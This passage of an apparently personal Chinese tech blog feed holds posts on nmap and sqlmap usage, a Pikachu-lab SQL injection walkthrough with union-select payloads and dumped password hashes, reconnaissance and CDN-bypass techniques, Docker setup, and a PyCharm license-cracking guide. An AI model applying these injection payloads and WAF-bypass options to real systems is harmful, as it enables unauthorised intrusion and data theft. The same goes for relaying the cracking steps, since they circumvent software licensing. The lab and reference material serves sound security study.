<td align="center">探测防火墙</td>
</tr>
<tr>
<td align="center">nmap -sP a.b.c.*</td>
<td align="center">探测在线主机</td>
</tr>
<tr>
<td align="center">nmap -F IP</td>
<td align="center">快速扫描</td>
</tr>
<tr>
<td align="center">nmap -r IP</td>
<td align="center">按顺序扫描</td>
</tr>
<tr>
<td align="center">nmap -iflist</td>
<td align="center">显示接口和路由信息</td>
</tr>
<tr>
<td align="center">nmap -p n1,n2… IP</td>
<td align="center">扫描指定端口</td>
</tr>
<tr>
<td align="center">nmap -p T:n1,n2… IP</td>
<td align="center">扫描TCP端口</td>
</tr>
<tr>
<td align="center">nmap -sU n1,n2… IP</td>
<td align="center">扫描UDP端口</td>
</tr>
<tr>
<td align="center">nmap -sV IP</td>
<td align="center">查看服务的版本</td>
</tr>
<tr>
<td align="center">nmap -PS IP</td>
<td align="center">TCP ACK扫描</td>
</tr>
<tr>
<td align="center">nmap -PA IP</td>
<td align="center">TCP SYN扫描</td>
</tr>
<tr>
<td align="center">nmap -sS IP</td>
<td align="center">隐蔽扫描</td>
</tr>
<tr>
<td align="center">nmap -sN IP</td>
<td align="center">TCP空扫描欺骗防火墙</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
        <category>命令</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>渗透命令</tag>
      </tags>
  </entry>
  <entry>
    <title>portainer docker的web管理页面</title>
    <url>/2024/10/13/portainer-docker%E7%9A%84web%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2/</url>
    <content><![CDATA[<h2 id="portainer"><a href="#portainer" class="headerlink" title="portainer"></a>portainer</h2><p>一个web可视化的docker管理页面</p>
<h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><p>先搜索镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker search portainer</span><br></pre></td></tr></table></figure>
<p>一般我下载最多下载的那几个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull portainer/portainer-ce</span><br></pre></td></tr></table></figure>
<p>启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9000:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --name portainer portainer/portainer-ce</span><br></pre></td></tr></table></figure>
<p>-v 要挂载相关docker守护进程才能让portainer能够管理docker</p>
<p>-p 映射9000端口，默认http;网上的大哥说8000是k8s需要的端口，9443是https端口，没去验证。</p>
<p>接下来就可以登录管理了</p>
<h2 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h2><p>刚进web页面需要设置admin密码，创建账号，这个是直接创建新的管理</p>
<p>也可通过上传配置文件创建</p>
<p>选其中一个即可</p>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>docker命令</tag>
      </tags>
  </entry>
  <entry>
    <title>pycharm激活</title>
    <url>/2024/08/10/pycharm%E6%BF%80%E6%B4%BB/</url>
    <content><![CDATA[<h2 id="检查链接"><a href="#检查链接" class="headerlink" title="检查链接"></a>检查链接</h2><p>网址：<a href="https://3.jetbra.in/">https://3.jetbra.in/</a></p>
<p>带小地图和*的标志，我们点进去<br><img src="/images/pasted-27.png" alt="upload successful"></p>
<h2 id="下载工具软件"><a href="#下载工具软件" class="headerlink" title="下载工具软件"></a>下载工具软件</h2><p>下载图中jetbra.zip<br><img src="/images/pasted-28.png" alt="upload successful"></p>
<p>解压，打开文件，进入scripts，双击图中文件<br><img src="/images/pasted-30.png" alt="upload successful"></p>
<p>等待10~20秒，会出现一个弹窗done，一般这个时候重启pycharm就已经激活，没有激活可以继续下面步骤。<br><img src="/images/pasted-31.png" alt="upload successful"></p>
<h2 id="激活码激活"><a href="#激活码激活" class="headerlink" title="激活码激活"></a>激活码激活</h2><p>点击图中pycharm复制<br><img src="/images/pasted-32.png" alt="upload successful"></p>
<p>复制激活<br><img src="/images/pasted-34.png" alt="upload successful"></p>
<p><img src="/images/pasted-33.png" alt="upload successful"></p>
<h1 id="下载的工具软件不能删除，删除失效！！"><a href="#下载的工具软件不能删除，删除失效！！" class="headerlink" title="下载的工具软件不能删除，删除失效！！"></a>下载的工具软件不能删除，删除失效！！</h1>]]></content>
      <categories>
        <category>代码</category>
        <category>工具安装</category>
      </categories>
      <tags>
        <tag>工具安装</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2025/03/05/sqlmap/</url>
    <content><![CDATA[<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>自动测试注入已找到的sql注入漏洞点</p>
<h2 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h2><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">详解</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-u “url”</td>
<td align="left">注入的url</td>
</tr>
<tr>
<td align="center">–data</td>
<td align="left">post请求payload</td>
</tr>
<tr>
<td align="center">–cookie</td>
<td align="left">cookie注入</td>
</tr>
<tr>
<td align="center">–dbs</td>
<td align="left">列出所有数据库</td>
</tr>
<tr>
<td align="center">-tables</td>
<td align="left">列出所有表</td>
</tr>
<tr>
<td align="center">-D</td>
<td align="left">指定数据库</td>
</tr>
<tr>
<td align="center">-T</td>
<td align="left">指定表</td>
</tr>
<tr>
<td align="center">-C</td>
<td align="left">指定字段</td>
</tr>
<tr>
<td align="center">–dump</td>
<td align="left">跟在上面指定的参数一起使用，列出指定的数据</td>
</tr>
<tr>
<td align="center">–sql-shell</td>
<td align="left">写shell</td>
</tr>
<tr>
<td align="center">–batch</td>
<td align="left">默认选择y</td>
</tr>
<tr>
<td align="center">–eta</td>
<td align="left">盲注，显示时间和优化</td>
</tr>
<tr>
<td align="center">–os-cmd&#x3D;id</td>
<td align="left">执行系统命令</td>
</tr>
<tr>
<td align="center">–os-shell</td>
<td align="left">系统交互shell</td>
</tr>
<tr>
<td align="center">–os-pwn</td>
<td align="left">反弹shell</td>
</tr>
<tr>
<td align="center">–referer</td>
<td align="left">使用referer欺骗</td>
</tr>
<tr>
<td align="center">–users</td>
<td align="left">列数据库所有用户</td>
</tr>
<tr>
<td align="center">–threads</td>
<td align="left">多线程</td>
</tr>
<tr>
<td align="center">–file-read</td>
<td align="left">读指定文件</td>
</tr>
<tr>
<td align="center">–file-write</td>
<td align="left">写入指定文件</td>
</tr>
</tbody></table>
<blockquote>
<p>示例</p>
</blockquote>
<ol>
<li>post请求插入请求表单<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --data=&quot;id=1&amp;&quot; --batch</span><br></pre></td></tr></table></figure></li>
<li>列出数据库系统用户<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --users -v 0</span><br></pre></td></tr></table></figure></li>
<li>列出所有数据库名称<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --dbs --batch</span><br></pre></td></tr></table></figure></li>
<li>列出指定数据库的表<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --tables -D &quot;数据库名称&quot; -tables --batch</span><br></pre></td></tr></table></figure></li>
<li>列出指定表的数据<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;url&quot; --tables -D &quot;数据库名称&quot; -T &quot;表名&quot; --dump --batch</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="安全参数"><a href="#安全参数" class="headerlink" title="安全参数"></a>安全参数</h3><table>
<thead>
<tr>
<th align="center">参数</th>
<th align="left">详解</th>
</tr>
</thead>
<tbody><tr>
<td align="center">-proxy “url,url”</td>
<td align="left">代理</td>
</tr>
<tr>
<td align="center">–tamper</td>
<td align="left">Tamper 脚本,混淆 Payload</td>
</tr>
<tr>
<td align="center">–chunked</td>
<td align="left">分块传输编码</td>
</tr>
<tr>
<td align="center">–random-agent</td>
<td align="left">随机化 HTTP 头</td>
</tr>
<tr>
<td align="center">–delay&#x3D;5</td>
<td align="left">请求延迟</td>
</tr>
<tr>
<td align="center">–headers</td>
<td align="left">–headers&#x3D;”X-Forwarded-For:1.1.1.1”添加自定义 HTTP 头</td>
</tr>
<tr>
<td align="center">–charset</td>
<td align="left">强制指定字符集,绕过转义字符</td>
</tr>
</tbody></table>
<blockquote>
<p>示例</p>
</blockquote>
<ol>
<li>绕过 Cloudflare WAF<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://XXXXXXX.com?id=1&quot; \</span><br><span class="line">  --tamper=space2comment,randomcase,versionedmorekeywords \</span><br><span class="line">  --random-agent \</span><br><span class="line">  --delay=3 \</span><br><span class="line">  --dbms=MySQL \</span><br><span class="line">  --level=5 \</span><br><span class="line">  --risk=3</span><br></pre></td></tr></table></figure></li>
<li>GBK 宽字节注入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://XXXXXXX.com?id=1%df%27&quot; \</span><br><span class="line">  --charset=gbk \</span><br><span class="line">  --tamper=unmagicquotes \</span><br><span class="line">  --dbms=MySQL \</span><br><span class="line">  --dbs</span><br></pre></td></tr></table></figure></li>
<li>JSON 参数注入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://target.com/api&quot; \</span><br><span class="line">  --data=&#x27;&#123;&quot;id&quot;:&quot;1*&quot;&#125;&#x27; \</span><br><span class="line">  --param-del=&quot;:&quot; \</span><br><span class="line">  --headers=&quot;Content-Type: application/json&quot; \</span><br><span class="line">  --dbms=MySQL</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>-v #详细的等级(0-6)<br>0：只显示Python的回溯，错误和关键消息。<br>1：显示信息和警告消息。<br>2：显示调试消息。<br>3：有效载荷注入。<br>4：显示HTTP请求。<br>5：显示HTTP响应头。<br>6：显示HTTP响应页面的内容</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>sql注入-pikachu</title>
    <url>/2025/02/27/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>使用burp suite工具攻击<br>如果想要去除干扰信息，后面的id&#x3D;1可以改成非法id&#x3D;-2</p>
<h3 id="获取当前数据库名称和版本"><a href="#获取当前数据库名称和版本" class="headerlink" title="获取当前数据库名称和版本"></a>获取当前数据库名称和版本</h3><ol>
<li><p>抓包修改参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select database(),version()&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-92.png" alt="upload successful"></p>
</li>
<li><p>可以得出结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,pikachu</span><br><span class="line">your email is: 5.7.26-0ubuntu0.18.04.1-log</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="获取该数据库表名"><a href="#获取该数据库表名" class="headerlink" title="获取该数据库表名"></a>获取该数据库表名</h3><ol>
<li><p>修改参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(table_name),2 from information_schema.tables where table_schema=&#x27;pikachu&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
</li>
<li><p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,httpinfo,member,message,users,xssblind</span><br><span class="line">your email is: 2</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="查看表users的列名"><a href="#查看表users的列名" class="headerlink" title="查看表users的列名"></a>查看表users的列名</h3><ol>
<li><p>修改参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(column_name),2 from information_schema.columns where table_schema=&#x27;pikachu&#x27; and table_name=&#x27;users&#x27;&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
</li>
<li><p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,id,username,password,level</span><br><span class="line">your email is: 2</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="查看表users中的账号密码"><a href="#查看表users中的账号密码" class="headerlink" title="查看表users中的账号密码"></a>查看表users中的账号密码</h3><ol>
<li><p>修改参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 union select group_concat(username),group_concat(password) from users&amp;submit=%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
</li>
<li><p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select your userid?</span><br><span class="line"></span><br><span class="line">hello,vince</span><br><span class="line">your email is: vince@pikachu.com</span><br><span class="line"></span><br><span class="line">hello,admin,pikachu,test</span><br><span class="line">your email is: e10adc3949ba59abbe56e057f20f883e,670b14728ad9902aecba32e22fa4f6bd,e99a18c428cb38d5f260853678922e03</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="得到的密码进行解码"><a href="#得到的密码进行解码" class="headerlink" title="得到的密码进行解码"></a>得到的密码进行解码</h3><p>随便搜索在线解密<br><img src="/images/pasted-93.png" alt="upload successful"></p>
<blockquote>
<p>其他注入类型原理相似，通过找到SQL命令可执行的格式进行注入，通过sqlmap都能成功注入</p>
</blockquote>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>sql注入</tag>
        <tag>pikachu</tag>
      </tags>
  </entry>
  <entry>
    <title>switch大气层升级18.1.0</title>
    <url>/2024/08/22/switch%E5%A4%A7%E6%B0%94%E5%B1%82%E5%8D%87%E7%BA%A7/</url>
    <content><![CDATA[<h2 id="下载离线固件和大气层最新包"><a href="#下载离线固件和大气层最新包" class="headerlink" title="下载离线固件和大气层最新包"></a>下载离线固件和大气层最新包</h2><p>下载地址:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/rumla34/Atmosphere-stable/releases/tag/1.7.1</span><br></pre></td></tr></table></figure>

<p>下载大气层和固件之后，通过switch选择系统页面的usb工具替换这两个文件</p>
<h2 id="升级步骤"><a href="#升级步骤" class="headerlink" title="升级步骤"></a>升级步骤</h2><p>仅保留emuMMC和Nintendo两个文件，其余文件删除，然后将下载的文件都解压放到sd卡根目录</p>
<p>然后选择虚拟系统启动，打开大气层软件，一个白色太阳的图标，然后选择我们保存的大气层固件文件夹，更新即可</p>
]]></content>
      <categories>
        <category>switch</category>
      </categories>
      <tags>
        <tag>switch大气层</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全攻防-信息收集</title>
    <url>/2024/11/21/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h2 id="收集域名信息"><a href="#收集域名信息" class="headerlink" title="收集域名信息"></a>收集域名信息</h2><h3 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h3><p>在Kali系统中，Whois已经默认安装，只需输入要查询的域名即可</p>
<p>在线Whois查询的常用网站有爱站工具网（<a href="https://whois.aizhan.com)、站长之家(http//whois.chinaz.com%EF%BC%89%E5%92%8CVirusTotal%EF%BC%88https://www.virustotal.com%EF%BC%89%EF%BC%8C%E9%80%9A%E8%BF%87%E8%BF%99%E4%BA%9B%E7%BD%91%E7%AB%99%E5%8F%AF%E4%BB%A5%E6%9F%A5%E8%AF%A2%E5%9F%9F%E5%90%8D%E7%9A%84%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%95%86%E3%80%81%E5%9F%9F%E5%90%8D%E6%8B%A5%E6%9C%89%E8%80%85%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%BB%96%E4%BB%AC%E7%9A%84%E9%82%AE%E7%AE%B1%E3%80%81%E7%94%B5%E8%AF%9D%E3%80%81%E5%9C%B0%E5%9D%80%E7%AD%89">https://whois.aizhan.com）、站长之家（http://whois.chinaz.com）和VirusTotal（https://www.virustotal.com），通过这些网站可以查询域名的相关信息，如域名服务商、域名拥有者，以及他们的邮箱、电话、地址等</a></p>
<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><p>常用的网站有以下这两个。</p>
<pre><code>ICP备案查询网：http://www.beianbeian.com。
天眼查：http://www.tianyancha.com。
</code></pre>
<h2 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h2><h3 id="搜索引擎使用技巧"><a href="#搜索引擎使用技巧" class="headerlink" title="搜索引擎使用技巧"></a>搜索引擎使用技巧</h3><table>
<thead>
<tr>
<th align="center">关键字</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Site</td>
<td align="left">指定域名</td>
</tr>
<tr>
<td align="center">inurt</td>
<td align="left">URL中存在关键字的网页</td>
</tr>
<tr>
<td align="center">Intext</td>
<td align="left">网页正文中的关键字</td>
</tr>
<tr>
<td align="center">Filetype</td>
<td align="left">指定文件类型</td>
</tr>
<tr>
<td align="center">Intitle</td>
<td align="left">网页标题中的关键字</td>
</tr>
<tr>
<td align="center">link</td>
<td align="left">link:baidu,com 即表示返回所有和 baidu.com 做了链接的 URL</td>
</tr>
<tr>
<td align="center">Info</td>
<td align="left">查找指定站点的一些基本信息</td>
</tr>
<tr>
<td align="center">cache</td>
<td align="left">搜索 Google 里关于某些内容的缓存</td>
</tr>
</tbody></table>
<p>例如：site:域名 intext:后台管理</p>
<p>或者通过github，如数据库连接信息、邮箱密码、uc-key、阿里的osskey，有时还可以找到泄露的源代码等。<br>可以通过乌云漏洞表（<a href="https://wooyun.shuimugan.com)查询历史漏洞信息./">https://wooyun.shuimugan.com）查询历史漏洞信息。</a></p>
<h2 id="收集子域名信息"><a href="#收集子域名信息" class="headerlink" title="收集子域名信息"></a>收集子域名信息</h2><h3 id="子域名检测工具"><a href="#子域名检测工具" class="headerlink" title="子域名检测工具"></a>子域名检测工具</h3><p>主要有Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute、Maltego CE等</p>
<p>文中主要推荐Layer子域名挖掘机、Sublist3r和subDomainsBrute</p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>搜索引擎查找，例如：site:baidu.com</p>
<p>第三方聚合应用枚举，利用三方服务汇聚的大量DNS数据集，DNSdumpster网站（<a href="https://dnsdumpster.com/%EF%BC%89%E3%80%81%E5%9C%A8%E7%BA%BFDNS%E4%BE%A6%E6%9F%A5%E5%92%8C%E6%90%9C%E7%B4%A2%E7%9A%84%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98%E5%87%BA%E6%8C%87%E5%AE%9A%E5%9F%9F%E6%BD%9C%E8%97%8F%E7%9A%84%E5%A4%A7%E9%87%8F%E5%AD%90%E5%9F%9F">https://dnsdumpster.com/）、在线DNS侦查和搜索的工具挖掘出指定域潜藏的大量子域</a></p>
<p>证书透明度公开日志枚举，crt.sh:<a href="https://crt.sh和censys:https://censys.io">https://crt.sh和censys:https://censys.io</a></p>
<p>子域名爆破网站（<a href="https://phpinfo.me/domain%EF%BC%89,IP%E5%8F%8D%E6%9F%A5%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%E7%BD%91%E7%AB%99%EF%BC%88http://dns.aizhan.com%EF%BC%89%E7%AD%89">https://phpinfo.me/domain）,IP反查绑定域名网站（http://dns.aizhan.com）等</a></p>
<h2 id="收集常用端口信息"><a href="#收集常用端口信息" class="headerlink" title="收集常用端口信息"></a>收集常用端口信息</h2><p>Nmap（具体的使用方法后续章节会详细介绍），无状态端口扫描工具Masscan、ZMap和御剑高速TCP端口扫描工具</p>
<p>邮件服务端口</p>
<table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="center">25</td>
<td align="center">SMTP邮件服务</td>
<td align="left">邮件伪造</td>
</tr>
<tr>
<td align="center">110</td>
<td align="center">POP3协议</td>
<td align="left">爆破、嗅探</td>
</tr>
<tr>
<td align="center">143</td>
<td align="center">IMAP协议</td>
<td align="left">爆破</td>
</tr>
</tbody></table>
<p>文件共享端口</p>
<table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="center">21&#x2F;22&#x2F;69</td>
<td align="center">Ftp&#x2F;Tftp 文件传输协议</td>
<td align="left">允许匿名的上传、下载、爆破和嗅探操作</td>
</tr>
<tr>
<td align="center">2049</td>
<td align="center">Nfs服务</td>
<td align="left">配置不当</td>
</tr>
<tr>
<td align="center">139</td>
<td align="center">Samba 服务</td>
<td align="left">爆破、未授权访问、远程代码执行</td>
</tr>
<tr>
<td align="center">389</td>
<td align="center">Ldap目录访问协议</td>
<td align="left">注入、允许匿名访问、弱口令</td>
</tr>
</tbody></table>
<p>远程端口</p>
<table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="center">22</td>
<td align="center">SSH远程连接</td>
<td align="left">爆破、SSH隧道及内网代理转发、文件传输</td>
</tr>
<tr>
<td align="center">23</td>
<td align="center">Telnet 远程连接</td>
<td align="left">爆破、嗅探、弱口令</td>
</tr>
<tr>
<td align="center">3389</td>
<td align="center">Rdp远程桌面连接</td>
<td align="left">Shift后门（需要Windows Server 2003以下的系 统)、爆破</td>
</tr>
<tr>
<td align="center">5900</td>
<td align="center">VNC</td>
<td align="left">弱口令爆破</td>
</tr>
<tr>
<td align="center">5632</td>
<td align="center">PyAnywhere 服务</td>
<td align="left">抓密码、代码执行</td>
</tr>
</tbody></table>
<p>数据库端口</p>
<table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="center">3306</td>
<td align="center">MySQL</td>
<td align="left">注入、提权、爆破</td>
</tr>
<tr>
<td align="center">1433</td>
<td align="center">MSSQL数据库</td>
<td align="left">注入、提权、SA弱口令、爆破</td>
</tr>
<tr>
<td align="center">1521</td>
<td align="center">Oracle 数据库</td>
<td align="left">TNS爆破、注入、反弹Shell</td>
</tr>
<tr>
<td align="center">5432</td>
<td align="center">PostgreSQL 数据库</td>
<td align="left">爆破、注入、弱口令</td>
</tr>
<tr>
<td align="center">27017&#x2F;27018</td>
<td align="center">MongoDB</td>
<td align="left">爆破、未授权访问</td>
</tr>
<tr>
<td align="center">6379</td>
<td align="center">Redis 数据库</td>
<td align="left">可尝试未授权访问、弱口令爆破</td>
</tr>
<tr>
<td align="center">5000</td>
<td align="center">SysBase&#x2F;DB2数据库</td>
<td align="left">爆破、注入</td>
</tr>
</tbody></table>
<p>web应用端口</p>
<table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="center">80&#x2F;443&#x2F;8080</td>
<td align="center">常见的Web服务端口</td>
<td align="left">Web攻击、爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td align="center">7001&#x2F;7002</td>
<td align="center">WebLogic 控制台</td>
<td align="left">Java反序列化、弱口令</td>
</tr>
<tr>
<td align="center">8080&#x2F;8089</td>
<td align="center">Jboss&#x2F;Resin&#x2F;Jetty&#x2F;Jenkins</td>
<td align="left">反序列化、控制台弱口令</td>
</tr>
<tr>
<td align="center">9090</td>
<td align="center">WebSphere 控制台</td>
<td align="left">Java反序列化、弱口令</td>
</tr>
<tr>
<td align="center">4848</td>
<td align="center">GlassFish 控制台</td>
<td align="left">弱口令</td>
</tr>
<tr>
<td align="center">1352</td>
<td align="center">Lotus domino 邮件服务</td>
<td align="left">弱口令、信息泄露、爆破</td>
</tr>
<tr>
<td align="center">10000</td>
<td align="center">Webmin-Web控制面板</td>
<td align="left">弱口令</td>
</tr>
</tbody></table>
<p>常见协议端口</p>
<table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="center">53</td>
<td align="center">DNS域名系统</td>
<td align="left">允许区域传送、DNS劫持、缓存投毒、欺骗</td>
</tr>
<tr>
<td align="center">67&#x2F;68</td>
<td align="center">DHCP服务</td>
<td align="left">劫持、欺骗</td>
</tr>
<tr>
<td align="center">161</td>
<td align="center">SNMP协议</td>
<td align="left">爆破、搜集目标内网信息</td>
</tr>
</tbody></table>
<p>特殊服务端口</p>
<table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">端口说明</th>
<th align="left">攻击方向</th>
</tr>
</thead>
<tbody><tr>
<td align="center">2181</td>
<td align="center">Zookeeper 服务</td>
<td align="left">未授权访问</td>
</tr>
<tr>
<td align="center">8069</td>
<td align="center">Zabbix服务</td>
<td align="left">远程执行、SQL注入</td>
</tr>
<tr>
<td align="center">9200&#x2F;9300</td>
<td align="center">Elasticsearch服务</td>
<td align="left">远程执行</td>
</tr>
<tr>
<td align="center">11211</td>
<td align="center">Memcache 服务</td>
<td align="left">未授权访问</td>
</tr>
<tr>
<td align="center">512&#x2F;513&#x2F;514</td>
<td align="center">Linux Rexec服务</td>
<td align="left">爆破、Rlogin 登录</td>
</tr>
<tr>
<td align="center">873</td>
<td align="center">Rsync 服务</td>
<td align="left">匿名访问、文件上传</td>
</tr>
<tr>
<td align="center">3690</td>
<td align="center">Svn服务</td>
<td align="left">Svn 泄露、未授权访问</td>
</tr>
<tr>
<td align="center">50000</td>
<td align="center">SAp Management Console</td>
<td align="left">远程执行</td>
</tr>
</tbody></table>
<h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>指纹是指网站CMS指纹识别、计算机操作系统及Web容器的指纹识别等</p>
<p>在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</p>
<p>常见的CMS有Dedecms（织梦）、Discuz、PHPWEB、PHPWind、PHPCMS、ECShop、Dvbbs、SiteWeaver、ASPCMS、帝国、Z-Blog、WordPress等</p>
<p>代表工具有<br>御剑Web指纹识别、WhatWeb、WebRobo、椰树、轻量WEB指纹识别等，可以快速识别一些主流CMS</p>
<p>在线：<br>BugScaner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br>云悉指纹：<a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a><br>WhatWeb：<a href="https://whatweb.net/">https://whatweb.net/</a></p>
<h2 id="查找真实IP"><a href="#查找真实IP" class="headerlink" title="查找真实IP"></a>查找真实IP</h2><p>客户如果存在使用cdn的情况可以通过以下方法绕过CDN寻找真实IP</p>
<pre><code>1、内部邮箱源。一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域名IP,ping这个邮件服务器的域名，就可以获得目标的真实IP（注意，必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的）。
2、扫描网站测试文件，如phpinfo、test等，从而找到目标的真实IP。
3、分站域名。很多网站主站的访问量会比较大，所以主站都是挂CDN的，但是分站可能没有挂CDN，可以通过ping二级域名获取分站IP，可能会出现分站和主站不是同一个IP但在同一个C段下面的情况，从而能判断出目标的真实IP段。
4、国外访问。国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站App Synthetic Monitor（https://asm.ca.com/en/ping.php）访问，可能会得到真实的IP
5、查询域名的解析记录。也许目标很久以前并没有用过CDN，所以可以通过网站NETCRAFT（https://www.netcraft.com/）来观察域名的IP历史记录，也可以大致分析出目标的真实IP段。
6、如果目标网站有自己的App，可以尝试利用Fiddler或Burp Suite抓取App的请求，从里面找到目标的真实IP。
7、绕过CloudFlare CDN查找真实IP。现在很多网站都使用CloudFlare提供的CDN服务，在确定了目标网站使用CDN后，可以先尝试通过在线网站Cloud FlareWatch（http://www.crimeflare.us/cfs.xhtml#box）对CloudFlare客户网站进行真实IP查询，结果如图1-12所示。
</code></pre>
<p>验证是否确实获取到了，文中给的方法是用ip或者似Masscan的工具验证</p>
<p>可以使用修改本机hosts访问域名再次验证。</p>
<h2 id="收集敏感目录文件"><a href="#收集敏感目录文件" class="headerlink" title="收集敏感目录文件"></a>收集敏感目录文件</h2><p>工具推荐</p>
<p>针对网站目录的扫描主要有DirBuster、御剑后台扫描珍藏版、wwwscan、Spinder.py（轻量级快速单文件目录后台扫描）、Sensitivefilescan（轻量级快速单文件目录后台扫描）、Weakfilescan（轻量级快速单文件目录后台扫描）等</p>
